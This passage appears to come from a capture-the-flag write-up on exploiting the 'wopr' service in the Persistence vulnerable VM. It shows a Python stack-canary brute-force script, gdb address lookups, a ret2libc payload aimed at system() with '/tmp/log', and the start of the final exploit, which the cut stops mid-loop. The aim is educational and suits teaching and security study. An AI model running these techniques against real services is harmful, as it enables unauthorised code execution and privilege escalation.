b7fff000-b8000000 rw-p 0001c000 08:01 <span style=color:#ae81ff>1579852</span>    /lib/i386-linux-gnu/ld-2.13.so
bffdf000-c0000000 rw-p <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>          <span style=color:#f92672>[</span>stack<span style=color:#f92672>]</span>
</code></pre></div><p>So it looks like we may have a <a href=http://en.wikipedia.org/wiki/Stack_buffer_overflow>buffer overflow</a> here. What is important though is the backtrace shows that the last fail was in <code>__fortify_fail</code>. <code>__fortify_fail</code> is normally just a error reporter, as was called because the stack cookie check failed. Remember the CANARY we detected earlier with the <code>checksec</code> output? With that knowledge, is almost safe to assume that byte 30 is where the stack canary starts. This means that if we want to corrupt more memory further up the stack (which is what we want actually), we need to find a way to know what the canary value is.</p>
<p>But lets not stop there. I continued to place more A&rsquo;s into the input until at byte 39 I noticed 41 (hex for A) in the backtrace. By the time I had 42 A&rsquo;s, the backtrace had a full 4 bytes of 41.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> got a connection
*** stack smashing detected ***: wopr terminated
<span style=color:#f92672>=======</span> Backtrace: <span style=color:#f92672>=========</span>
/lib/i386-linux-gnu/libc.so.6<span style=color:#f92672>(</span>__fortify_fail+0x40<span style=color:#f92672>)[</span>0xb7f5ebb0<span style=color:#f92672>]</span>
/lib/i386-linux-gnu/libc.so.6<span style=color:#f92672>(</span>+0xeab6a<span style=color:#f92672>)[</span>0xb7f5eb6a<span style=color:#f92672>]</span>
wopr<span style=color:#f92672>[</span>0x80487dc<span style=color:#f92672>]</span>
<span style=color:#f92672>[</span>0x41414141<span style=color:#f92672>]</span>        <span style=color:#75715e>#&lt;-- EIP?</span>
</code></pre></div><p>Was this where EIP was?
With the debugging we have done thus far, lets assume that the stack layout looks something like this:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>- -&gt;         - -&gt;        [42 Bytes  in Total]        - -&gt;         - &gt;

[        30 Bytes Data         ] [  Cookie  ] [  4 Bytes  ] [  EIP  ]

- -&gt;         - -&gt;        [42 Bytes  in Total]        - -&gt;         - &gt;
</code></pre></div><h2 id=wopr---stack-canary-bruteforce>wopr - stack canary bruteforce<a hidden class=anchor aria-hidden=true href=#wopr---stack-canary-bruteforce>#</a></h2>
<p>This part of the challenge took me the second longest to nail. I have zero knowledge of stack cookies, let alone experience in bypassing them. So I had to pack out my best Google-fu abilities and learn all I can about bypassing these cookies.</p>
<p>A lot was learnt here. The 3 primary resources that really helped me get the ball rolling into something workable was</p>
<ul>
<li><a href=http://phrack.org/issues/67/13.html>Phrack Issue 67</a></li>
<li><a href=http://fluxius.handgrep.se/2011/10/20/the-art-of-elf-analysises-and-exploitations/>The Art Of ELF: Analysis and Exploitations</a></li>
<li><a href=http://www.pwntester.com/blog/2013/12/31/fusion-level04-write-up/>Fusion level04 write-up</a> (SPOILER ALERTS for another CTF)</li>
</ul>
<p>Now, remember I mentioned <code>fork()</code> earlier on? From the Phrack article, we can read some interesting ideas about binaries that make use of <code>fork()</code> and how this affects stack cookies.</p>
<p>From <code>man 2 fork</code>&rsquo;s description:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>DESCRIPTION
     Fork<span style=color:#f92672>()</span> causes creation of a new process.  The new process <span style=color:#f92672>(</span>child process<span style=color:#f92672>)</span>
     is an exact copy of the calling process <span style=color:#f92672>(</span>parent process<span style=color:#f92672>)</span> except <span style=color:#66d9ef>for</span> the
     following:

 <span style=color:#f92672>[</span>.. snip ..<span style=color:#f92672>]</span>
</code></pre></div><p>What this means for us then is that every time we have a new <code>fork()</code> happen, the stack cookie will supposedly remain constant between forks as it comes from the parent. <em>”Soooooooo what?”</em> I hear you say! Well, that means we can attempt to try all of the possible ASCII characters as hex, 4 times (for 4 bytes), to try and brute force this value!</p>
<p>The theory for this was great, but the practice was a different story. In order to perform a successful brute force, at the very minimum, I needed a reliable way to determine a correct and incorrect value. With my local copy of <code>wopr</code>, I can just watch the console output, however, I don&rsquo;t have that luxury on the Persistence VM!</p>
<p>While thinking about this problem, I started to code a little script to start the juices flowing in getting this brute force right. The basic idea was to have a nested xrange(4) -> xrange(255) concat the values to a variable as they are determined. While tinkering with the script and the TCP socket code, I started to realize that there may actually be a way to remotely determine a failed and successful attempt!</p>
<p>When a string of less than 30 A&rsquo;s is sent, the server will send a &ldquo;[+] bye!&rdquo; message before closing the socket. More than 30 A&rsquo;s, and the socket is killed before the bye</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# telnet 127.0.0.1 <span style=color:#ae81ff>3333</span>
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is <span style=color:#e6db74>&#39;^]&#39;</span>.
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> hello, my name is sploitable
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> would you like to play a game?
&gt; A
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> yeah, I don<span style=color:#e6db74>&#39;t think so
</span><span style=color:#e6db74>[+] bye!                           # &lt;-- We have a bye!
</span><span style=color:#e6db74>Connection closed by foreign host.
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>root@kali:~# telnet 127.0.0.1 3333
</span><span style=color:#e6db74>Trying 127.0.0.1...
</span><span style=color:#e6db74>Connected to 127.0.0.1.
</span><span style=color:#e6db74>Escape character is &#39;</span>^<span style=color:#f92672>]</span><span style=color:#e6db74>&#39;.
</span><span style=color:#e6db74>[+] hello, my name is sploitable
</span><span style=color:#e6db74>[+] would you like to play a game?
</span><span style=color:#e6db74>&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span><span style=color:#e6db74>[+] yeah, I don&#39;</span>t think so
Connection closed by foreign host. <span style=color:#75715e># &lt;-- No bye!</span>
</code></pre></div><p>This was perfect and exactly what was needed to complete the brute force script! All I had to do was check for the word <em>bye</em> in the last socket receive to know if we have succeeded or not. The resultant script was therefore:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> socket
<span style=color:#f92672>import</span> sys

payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;A&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>30</span>  <span style=color:#75715e># amount of bytes before the first canary bit is hit</span>
canary <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>         <span style=color:#75715e># the canary</span>

<span style=color:#75715e># start the canary brute loop. We want to brute 4 bytes ...</span>
<span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> xrange(<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>5</span>):

    <span style=color:#75715e># ... and try all possibilities</span>
    <span style=color:#66d9ef>for</span> canary_byte <span style=color:#f92672>in</span> xrange(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>256</span>):

        <span style=color:#75715e># prepare the byte</span>
        hex_byte <span style=color:#f92672>=</span> chr(canary_byte)

        <span style=color:#75715e># prepare the payload</span>
        send <span style=color:#f92672>=</span> payload <span style=color:#f92672>+</span> canary <span style=color:#f92672>+</span> hex_byte

        print <span style=color:#e6db74>&#34;[+] Trying: &#39;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>x</span><span style=color:#e6db74>{0}</span><span style=color:#e6db74>&#39; in payload &#39;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#39; (</span><span style=color:#e6db74>%d</span><span style=color:#e6db74>:</span><span style=color:#e6db74>%d</span><span style=color:#e6db74>/255)&#34;</span><span style=color:#f92672>.</span>format(hex_byte<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#34;hex&#34;</span>)) <span style=color:#f92672>%</span> (send, x, canary_byte)

        sock <span style=color:#f92672>=</span> socket<span style=color:#f92672>.</span>socket(socket<span style=color:#f92672>.</span>AF_INET, socket<span style=color:#f92672>.</span>SOCK_STREAM)
        sock<span style=color:#f92672>.</span>connect((<span style=color:#e6db74>&#39;127.0.0.1&#39;</span>, <span style=color:#ae81ff>3333</span>))

        <span style=color:#75715e># get the inital banners</span>
        sock<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>35</span>)   <span style=color:#75715e># [+] hello, my name is sploitable\n</span>
        sock<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>40</span>)   <span style=color:#75715e># [+] would you like to play a game?\n</span>
        sock<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>5</span>)    <span style=color:#75715e># &gt;</span>

        <span style=color:#75715e># send the payload</span>
        sock<span style=color:#f92672>.</span>send(send)
        sock<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>27</span>)   <span style=color:#75715e># [+] yeah, I don&#39;t think so\n</span>

        <span style=color:#75715e># if we have a OK response, then we will have this last part</span>
        <span style=color:#75715e># as &#39;[+] bye!\n&#39; populated, if its wrong, not</span>
        data <span style=color:#f92672>=</span>  sock<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>64</span>)   <span style=color:#75715e># [+] bye!\n</span>
        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;bye&#34;</span> <span style=color:#f92672>in</span> data:
            print <span style=color:#e6db74>&#34;[!!] Found a possible canary value of &#39;</span><span style=color:#e6db74>{0}</span><span style=color:#e6db74>&#39;!&#34;</span><span style=color:#f92672>.</span>format(hex_byte<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#34;hex&#34;</span>))
            canary <span style=color:#f92672>+=</span> hex_byte
            sock<span style=color:#f92672>.</span>close()
            <span style=color:#66d9ef>break</span>

        sock<span style=color:#f92672>.</span>close()

    <span style=color:#75715e># if we cant even find the first byte, we failed already</span>
    <span style=color:#66d9ef>if</span> len(canary) <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>0</span>:
        print <span style=color:#e6db74>&#34;[-] Unable to even find the first bit. No luck&#34;</span>
        sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>0</span>)

<span style=color:#66d9ef>if</span> len(canary) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>:
    print <span style=color:#e6db74>&#34;[+] Canary seems to be </span><span style=color:#e6db74>{0}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(canary<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#34;hex&#34;</span>))
<span style=color:#66d9ef>else</span>:
    print <span style=color:#e6db74>&#34;[-] Unable to brute canary&#34;</span>
</code></pre></div><p>An example run of this would end as follows:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Trying: <span style=color:#e6db74>&#39;\x8d&#39;</span> in payload <span style=color:#e6db74>&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span> <span style=color:#f92672>(</span>4:141/255<span style=color:#f92672>)</span>
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Trying: <span style=color:#e6db74>&#39;\x8e&#39;</span> in payload <span style=color:#e6db74>&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span> <span style=color:#f92672>(</span>4:142/255<span style=color:#f92672>)</span>
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Trying: <span style=color:#e6db74>&#39;\x8f&#39;</span> in payload <span style=color:#e6db74>&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span> <span style=color:#f92672>(</span>4:143/255<span style=color:#f92672>)</span>
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Trying: <span style=color:#e6db74>&#39;\x90&#39;</span> in payload <span style=color:#e6db74>&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span> <span style=color:#f92672>(</span>4:144/255<span style=color:#f92672>)</span>
<span style=color:#f92672>[</span>!!<span style=color:#f92672>]</span> Found a possible canary value of <span style=color:#e6db74>&#39;90&#39;</span>!
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Canary seems to be 00ef8d90
</code></pre></div><p>Winning. Just to make 100% sure I actually have the correct canary, I made another small socket program just to append the canary to the initial 30 A&rsquo;s and send it. No stack smashing message appeared and we got the <em>bye</em> message :)</p>
<h2 id=wopr---nx-and-eip>wopr - NX and EIP<a hidden class=anchor aria-hidden=true href=#wopr---nx-and-eip>#</a></h2>
<p>If you can recall from earlier, <code>wopr</code> was compiled with the NX bit set. Effectively that means we can&rsquo;t simply exploit this vulnerability by setting EIP to the beginning of shellcode we simply sent along with the payload as the stack is not executable. Thankfully though, there is a concept such as ret2libc.</p>
<p>The idea behind ret2libc is to steer the application flow to useful commands within libc itself, and get code execution that way. A very popular function to use is the <code>system()</code> command, for almost obvious reasons.</p>
<p>I decided to make use of the same method. I quickly checked to see if ASLR was enabled on the Persistence VM:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>bash-4.1$ ldd /usr/local/bin/wopr
    linux-gate.so.1 <span style=color:#f92672>=</span>&gt;  <span style=color:#f92672>(</span>0xb7fff000<span style=color:#f92672>)</span>
    libc.so.6 <span style=color:#f92672>=</span>&gt; /lib/libc.so.6 <span style=color:#f92672>(</span>0xb7e62000<span style=color:#f92672>)</span>
    /lib/ld-linux.so.2 <span style=color:#f92672>(</span>0x00110000<span style=color:#f92672>)</span>

bash-4.1$ ldd /usr/local/bin/wopr
    linux-gate.so.1 <span style=color:#f92672>=</span>&gt;  <span style=color:#f92672>(</span>0xb7fff000<span style=color:#f92672>)</span>
    libc.so.6 <span style=color:#f92672>=</span>&gt; /lib/libc.so.6 <span style=color:#f92672>(</span>0xb7e62000<span style=color:#f92672>)</span>
    /lib/ld-linux.so.2 <span style=color:#f92672>(</span>0x00110000<span style=color:#f92672>)</span>
</code></pre></div><p>The addresses for the linked files remained static between all of the lookups, indicating that ASLR was not enabled. This makes things slightly easier. Because this is a 32bit OS though, even if it was enabled it would not have been too much of a issue :)</p>
<p>The next step was to find out where system() lived in libc. This is also a very easy step to perform. A interesting note here. GDB was using the SHELL env variable for commands, and because I have come from rbash, it was still set to that. A simple <code>export SHELL=/bin/bash</code> fixed it though. Also, just to be clear, I am now doing this address lookup on the Persistence VM, however I had to do exactly the same thing on the Kali VM where I was building my exploit.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>bash-4.1$ export SHELL<span style=color:#f92672>=</span>/bin/bash

bash-4.1$ gdb -q /usr/bin/telnet
Reading symbols from /usr/bin/telnet...<span style=color:#f92672>(</span>no debugging symbols found<span style=color:#f92672>)</span>...done.
Missing separate debuginfos, use: debuginfo-install telnet-0.17-47.el6_3.1.i686
<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> b *main   <span style=color:#75715e># set a breakpoint to stop the flow once we hit the main() func</span>
Breakpoint <span style=color:#ae81ff>1</span> at 0x7b90

<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> r         <span style=color:#75715e># run the program</span>
Starting program: /usr/bin/telnet
Breakpoint 1, 0x00117b90 in main <span style=color:#f92672>()</span>

<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> p system  <span style=color:#75715e># We hit our breakpoint, lets leak the address for system()</span>
$1 <span style=color:#f92672>=</span> <span style=color:#f92672>{</span>&lt;text variable, no debug info&gt;<span style=color:#f92672>}</span> 0xb7e56210 &lt;system&gt;
<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span>
</code></pre></div><p>We find <code>system()</code> at <code>0xb7e56210</code>. I used the telnet binary simply because it is also linked to libc.</p>
<p>So to sum up what we have so far, lets take another look at what the stack will look like now when sending our exploit payload:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>- -&gt;         - -&gt;        [42 Bytes  in Total]        - -&gt;           - &gt;

[   A x 30   ] [  \xff\xff\xff\xff  ] [  AAAA  ] [  \x10\x62\xe5\xb7  ]
 ^~ Initial BF    ^~ Bruted cookie                    ^~ system()

- -&gt;         - -&gt;        [42 Bytes  in Total]        - -&gt;           - &gt;
</code></pre></div><p>The address for <code>system()</code> is &lsquo;backwards&rsquo; because we are working with a <a href=http://en.wikipedia.org/wiki/Endianness>little endian</a> system. The 4 * A before the address to <code>system()</code> is simply padding to EIP.</p>
<h2 id=wopr---code-exec>wopr - code exec<a hidden class=anchor aria-hidden=true href=#wopr---code-exec>#</a></h2>
<p>This part, by far, took me <strong>the longest</strong> of the entire challenge!</p>
<p>The next step was to get actual code to execute using <code>system()</code>. While this may sound trivial, it has challenges of its own. One of the key things I had to realize whilst getting frustrated with this was &ldquo;to remember, you are trying to make a program do what it is not intended to do, expect difficulty!&rdquo;.</p>
<p>I tried to put a command in a env variable and failed.
I attempted to write a ROP chain and failed.</p>
<p>These failed mostly due to by own lack of understanding, tiredness and frustration. My attempts generally was to get a script <code>/tmp/runme</code> to run. <code>runme</code> was a bash script that will compile a small C shell, change ownership and set the suid bit. Yes, Persistence had <code>gcc</code> installed :)</p>
<p>&ldquo;fail&rdquo; * 100000 * 100000. That is a rough guestimate of the amount of times I tried this part.</p>
<p>Eventually, I finally came to the realization that I may have to search for other avenues of code execution. In fact, I completely stepped away from the VM and did something else.</p>
<p>Returning later with a fresh look, I run wopr through <code>strings</code> one more time:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~/Desktop/persistence# strings  wopr
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used

<span style=color:#f92672>[</span>.. snip ..<span style=color:#f92672>]</span>

<span style=color:#f92672>[</span>^_<span style=color:#f92672>]</span>
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> yeah, I don<span style=color:#960050;background-color:#1e0010>&#39;</span>t think so
socket
setsockopt
bind
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> bind complete
listen
/tmp/log          <span style=color:#75715e># &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span>
TMPLOG
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> waiting <span style=color:#66d9ef>for</span> connections
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> logging queries to $TMPLOG
accept
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> got a connection
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> hello, my name is sploitable
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> would you like to play a game?
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> bye!
</code></pre></div><p>See that? Can you <strong>see</strong> that&mldr; We have <code>/tmp/log</code> RIGHT THERE!</p>
<p>I confirmed that <code>/tmp/log</code> wasn&rsquo;t actually in use, and moved my original <code>/tmp/runme</code> script there.</p>
<p>The only thing that was left now was to find the location of the string <code>/tmp/log</code> in <code>wopr</code>, push that to the stack, and ride the bus home. So lets do the hard work required to find this valuable piece of the puzzle:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# gdb -q ./wopr
Reading symbols from wopr...<span style=color:#f92672>(</span>no debugging symbols found<span style=color:#f92672>)</span>...done.

gdb-peda$ b *main
Breakpoint <span style=color:#ae81ff>1</span> at 0x80487de

gdb-peda$ r
<span style=color:#f92672>[</span>----------------------------------registers-----------------------------------<span style=color:#f92672>]</span>
EAX: 0xbffff4a4 --&gt; 0xbffff60a <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;wopr&#34;</span><span style=color:#f92672>)</span>
EBX: 0xb7fbfff4 --&gt; 0x14bd7c
ECX: 0x66a6f92e
EDX: 0x1
ESI: 0x0
EDI: 0x0
EBP: 0xbffff478 --&gt; 0x0
ESP: 0xbffff3fc --&gt; 0xb7e8ae36 <span style=color:#f92672>(</span>&lt;__libc_start_main+230&gt;:    mov    DWORD PTR <span style=color:#f92672>[</span>esp<span style=color:#f92672>]</span>,eax<span style=color:#f92672>)</span>
EIP: 0x80487de <span style=color:#f92672>(</span>&lt;main&gt;: push   ebp<span style=color:#f92672>)</span>
EFLAGS: 0x246 <span style=color:#f92672>(</span>carry PARITY adjust ZERO sign trap INTERRUPT direction overflow<span style=color:#f92672>)</span>
<span style=color:#f92672>[</span>-------------------------------------code-------------------------------------<span style=color:#f92672>]</span>
   0x80487d7 &lt;get_reply+99&gt;:    call   0x804865c &lt;__stack_chk_fail@plt&gt;
   0x80487dc &lt;get_reply+104&gt;:   leave
   0x80487dd &lt;get_reply+105&gt;:   ret
<span style=color:#f92672>=</span>&gt; 0x80487de &lt;main&gt;:    push   ebp
   0x80487df &lt;main+1&gt;:  mov    ebp,esp
   0x80487e1 &lt;main+3&gt;:  sub    esp,0x258
   0x80487e7 &lt;main+9&gt;:  mov    eax,DWORD PTR <span style=color:#f92672>[</span>ebp+0x8<span style=color:#f92672>]</span>
   0x80487ea &lt;main+12&gt;: mov    DWORD PTR <span style=color:#f92672>[</span>ebp-0x23c<span style=color:#f92672>]</span>,eax
<span style=color:#f92672>[</span>------------------------------------stack-------------------------------------<span style=color:#f92672>]</span>
0000| 0xbffff3fc --&gt; 0xb7e8ae36 <span style=color:#f92672>(</span>&lt;__libc_start_main+230&gt;:   mov    DWORD PTR <span style=color:#f92672>[</span>esp<span style=color:#f92672>]</span>,eax<span style=color:#f92672>)</span>
0004| 0xbffff400 --&gt; 0x1
0008| 0xbffff404 --&gt; 0xbffff4a4 --&gt; 0xbffff60a <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;wopr&#34;</span><span style=color:#f92672>)</span>
0012| 0xbffff408 --&gt; 0xbffff4ac --&gt; 0xbffff629 <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;SSH_AGENT_PID=3171&#34;</span><span style=color:#f92672>)</span>
0016| 0xbffff40c --&gt; 0xb7fe08d8 --&gt; 0xb7e74000 --&gt; 0x464c457f
0020| 0xbffff410 --&gt; 0xb7ff6821 <span style=color:#f92672>(</span>mov    eax,DWORD PTR <span style=color:#f92672>[</span>ebp-0x10<span style=color:#f92672>])</span>
0024| 0xbffff414 --&gt; 0xffffffff
0028| 0xbffff418 --&gt; 0xb7ffeff4 --&gt; 0x1cf2c
<span style=color:#f92672>[</span>------------------------------------------------------------------------------<span style=color:#f92672>]</span>
Legend: code, data, rodata, value
Breakpoint 1, 0x080487de in main <span style=color:#f92672>()</span>

gdb-peda$ searchmem /tmp/log
Searching <span style=color:#66d9ef>for</span> <span style=color:#e6db74>&#39;/tmp/log&#39;</span> in: None ranges
Found <span style=color:#ae81ff>2</span> results, display max <span style=color:#ae81ff>2</span> items:
wopr : 0x8048c60 <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/tmp/log&#34;</span><span style=color:#f92672>)</span>
wopr : 0x8049c60 <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/tmp/log&#34;</span><span style=color:#f92672>)</span>
</code></pre></div><p><code>/tmp/log</code> can be found in 2 places. Lets choose <code>0x8048c60</code>! Now we finally have everything we need to build the payload to send.</p>
<h2 id=wopr---the-exploit>wopr - the exploit<a hidden class=anchor aria-hidden=true href=#wopr---the-exploit>#</a></h2>
<p>To sum up what we have to do to exploit this, we can say that we have to:</p>
<ul>
<li>Provide a string of size 30</li>
<li>Provide the canary we have brute forced</li>
<li>Pad with 4 bytes</li>
<li>Write EIP to the location of <code>system()</code></li>
<li>Provide 4 bytes of JUNK (or the location of <code>exit()</code> as a return)</li>
<li>Provide the location of <code>/tmp/log</code></li>
</ul>
<p>In my exploit, as a result of the above, I would therefore send a payload similar to this:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#34; + &#34;\xff\xff\xff\xff&#34; + &#34;AAAA&#34; +
&#34;\x10\xc2\x16\x00&#34; + &#34;JUNK&#34; + &#34;\x60\x8c\x04\x08&#34;
</code></pre></div><p>I finished up coding the exploit, which eventually resulted in the following:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> socket
<span style=color:#f92672>import</span> sys
<span style=color:#f92672>import</span> os

payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;A&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>30</span>  <span style=color:#75715e># amount of bytes to before the canary is hit</span>
canary <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>     <span style=color:#75715e># canary that should update as its bruted</span>

print <span style=color:#e6db74>&#34;&#34;&#34;
</span><span style=color:#e6db74>            A: &#34;So, I heard you like pain...?&#34;
</span><span style=color:#e6db74>            B: &#34;... a bit&#34;
</span><span style=color:#e6db74>            C: &#34;Well, here it is, the: &#34;
</span><span style=color:#e6db74> ____   ___  ____    _____ ____ _____ ______    ___  ____     __    ___
</span><span style=color:#e6db74>|    \ /  _]|    \  / ___/|    / ___/|      |  /  _]|    \   /  ]  /  _]
</span><span style=color:#e6db74>|  o  )  [_ |  D  )(   \_  |  (   \_ |      | /  [_ |  _  | /  /  /  [_
</span><span style=color:#e6db74>|   _/    _]|    /  \__  | |  |\__  ||_|  |_||    _]|  |  |/  /  |    _]
</span><span style=color:#e6db74>|  | |   [_ |    \  /  \ | |  |/  \ |  |  |  |   [_ |  |  /   \_ |   [_
</span><span style=color:#e6db74>|  | |     ||  .  \ \    | |  |\    |  |  |  |     ||  |  \     ||     |
</span><span style=color:#e6db74>|__| |_____||__|\_|  \___||____|\___|  |__|  |_____||__|__|\____||_____|
</span><span style=color:#e6db74>      _____ ____  _       ___  ____  ______
</span><span style=color:#e6db74>     / ___/|    \| |     /   \|    ||      |
</span><span style=color:#e6db74>    (   \_ |  o  ) |    |     ||  | |      |
</span><span style=color:#e6db74>     \__  ||   _/| |___ |  O  ||  | |_|  |_|
</span><span style=color:#e6db74>     /  \ ||  |  |     ||     ||  |   |  |
</span><span style=color:#e6db74>     \    ||  |  |     ||     ||  |   |  |
</span><span style=color:#e6db74>      \___||__|  |_____| \___/|____|  |__|
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>                A: &#34;AKA: FU superkojiman &amp;&amp; sagi- !!&#34;
</span><span style=color:#e6db74>                A: &#34;I also have no idea what I am doing&#34;
</span><span style=color:#e6db74>&#34;&#34;&#34;</span>

print <span style=color:#e6db74>&#34;[+] Connecting &amp; starting canary brute force...&#34;</span>

<span style=color:#75715e># start the canary brute loop. We want to brute 4 bytes ...</span>
<span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> xrange(<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>5</span>):

    <span style=color:#75715e># ... and try all possibilities</span>
    <span style=color:#66d9ef>for</span> canary_byte <span style=color:#f92672>in</span> xrange(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>256</span>):

        <span style=color:#75715e># prepare the byte</span>
        hex_byte <span style=color:#f92672>=</span> chr(canary_byte)

        <span style=color:#75715e># prepare the payload</span>
        send <span style=color:#f92672>=</span> payload <span style=color:#f92672>+</span> canary <span style=color:#f92672>+</span> hex_byte

        <span style=color:#75715e># connect and send payload</span>
        sock <span style=color:#f92672>=</span> socket<span style=color:#f92672>.</span>socket(socket<span style=color:#f92672>.</span>AF_INET, socket<span style=color:#f92672>.</span>SOCK_STREAM)
        sock<span style=color:#f92672>.</span>connect((<span style=color:#e6db74>&#39;127.0.0.1&#39;</span>, <span style=color:#ae81ff>3333</span>))

        <span style=color:#75715e># get the inital banners</span>
        sock<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>35</span>)   <span style=color:#75715e># [+] hello, my name is sploitable\n</span>
        sock<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>40</span>)   <span style=color:#75715e># [+] would you like to play a game?\n</span>
        sock<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>5</span>)    <span style=color:#75715e># &gt;</span>

        <span style=color:#75715e># send the payload</span>
        sock<span style=color:#f92672>.</span>send(send)
        sock<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>27</span>)   <span style=color:#75715e># [+] yeah, I don&#39;t think so\n</span>

        <span style=color:#75715e># if we have a OK response, then we will have this last part</span>
        <span style=color:#75715e># as &#39;[+] bye!\n&#39; populated, if its wrong, not</span>
        data <span style=color:#f92672>=</span>  sock<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>64</span>)   <span style=color:#75715e># [+] bye!\n</span>
        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;bye&#34;</span> <span style=color:#f92672>in</span> data:
